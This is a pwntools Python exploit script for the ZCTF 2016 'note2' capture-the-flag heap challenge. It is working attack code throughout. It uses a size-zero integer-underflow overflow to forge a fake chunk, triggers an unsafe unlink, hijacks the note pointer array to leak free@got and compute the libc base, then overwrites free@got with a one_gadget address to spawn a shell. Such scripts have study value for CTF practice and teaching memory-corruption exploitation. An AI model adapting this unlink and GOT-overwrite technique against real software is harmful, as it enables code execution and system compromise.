from pwn import *

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

p = process("./data/bin/heap23_03_zctf_2016_note2")
elf = ELF("./data/bin/heap23_03_zctf_2016_note2")
libc = elf.libc


def new_note(size: int, content: bytes):
    p.recvuntil(b">>")
    p.sendline(b"1")
    p.recvuntil(b")")
    p.sendline(str(size).encode())
    p.recvuntil(b":")
    p.sendline(content)


def show_note(index: int):
    p.recvuntil(b">>")
    p.sendline(b"2")
    p.recvuntil(b":")
    p.sendline(str(index).encode())


def edit_note(index: int, choice: int, content: bytes):
    p.recvuntil(b">>")
    p.sendline(b"3")
    p.recvuntil(b":")
    p.sendline(str(index).encode())
    p.recvuntil(b"]")
    p.sendline(str(choice).encode())
    p.recvuntil(b":")
    p.sendline(content)


def delete_note(index: int):
    p.recvuntil(b">>")
    p.sendline(b"4")
    p.recvuntil(b":")
    p.sendline(str(index).encode())


def request2size(req: int) -> int:
    # glibc(amd64): align16(req + 0x10), minimal chunk size 0x20
    sz = (req + 0x10 + 0xF) & ~0xF
    return max(sz, 0x20)


# -------------------------
# tunable parameters
# -------------------------
x = 0x60  # note0 requested size
u = 0x00  # note1 requested size (must be 0 to trigger read loop bug)
y = 0x80  # note2 requested size

ptr_0 = 0x602120
fake_fd = ptr_0 - 0x18
fake_bk = ptr_0 - 0x10

# -------------------------
# derived constraints
# -------------------------
s0 = request2size(x)
s1 = request2size(u)
s2 = request2size(y)

# fake chunk size used in unlink check:
# chunksize(P) == prev_size(next_chunk(P))
f = s0 + s1 - 0x10
z = f | 1         # fake size in chunk0 (set prev_inuse bit)
l = s1 - 0x10     # overflow distance to chunk2->prev_size
m = f             # overwrite chunk2->prev_size
n = s2            # overwrite chunk2->size, with PREV_INUSE bit cleared

assert 0 <= x <= 0x80
assert 0 <= u <= 0x80
assert 0 <= y <= 0x80
assert u == 0, "need size=0 to trigger integer-underflow overflow in new_note"
assert f >= 0x20 and (f & 0xF) == 0
assert l >= 0
assert (n & 1) == 0
assert s2 > 0x80, "target chunk must not go to fastbin; need request2size(y) > 0x80"


# step.1 init
p.recvuntil(b":")
p.sendline(b"/bin/sh")
p.recvuntil(b":")
p.sendline(b"ddd")

# step.2 layout
note0_content = b"\x00" * 8 + p64(z) + p64(fake_fd) + p64(fake_bk)
new_note(x, note0_content)        # note0
new_note(u, b"AA")                # note1
new_note(y, b"/bin/sh")           # note2

# step.3 free note1, then re-alloc note1 with size=0 to overflow into note2 header
delete_note(1)
note1_content = b"\x00" * l + p64(m) + p64(n)
new_note(0, note1_content)

# step.4 free note2 -> backward consolidate -> unlink(fake chunk in note0)
delete_note(2)

# step.5 hijack ptr array to leak free@got
free_got = elf.got["free"]
payload = b"a" * 0x18 + p64(free_got)
edit_note(0, 1, payload)

show_note(0)
p.recvuntil(b"is ")
free_addr = u64(p.recv(6).ljust(8, b"\x00"))

# step.6 overwrite free@got
libc_addr = free_addr - libc.symbols["free"]
one_gadget = libc_addr + 0xF1247
edit_note(0, 1, p64(one_gadget))

p.interactive()
